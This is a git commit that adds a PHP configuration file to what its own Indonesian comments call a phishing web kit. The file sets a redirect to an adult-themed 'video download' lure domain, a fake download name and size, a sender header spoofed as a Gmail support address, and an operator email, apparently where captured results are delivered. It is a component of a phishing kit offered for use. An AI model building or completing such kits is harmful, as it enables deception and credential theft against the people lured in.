cd45860e025085753720e9ace91b5ee004655e8d
Dormamus <140526714+Dormamus@users.noreply.github.com>
2024-01-27 19:11:32 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://xnxx.health/'; // LINK DOWNLOAD VIDEO
+$namavideo = 'Nama File'; // NAMA WEB PHISING MU
+$download = '10,1MB'; // UKURAN DOWNLOAD
+
+$sender = 'From: WEB HANZ KECE🤩😜 <support@gmail.com>'; // NAMA RESULT MU
+$email = "emailmu@gmail.com"; // GANTI EMAIL MU
+
+?>
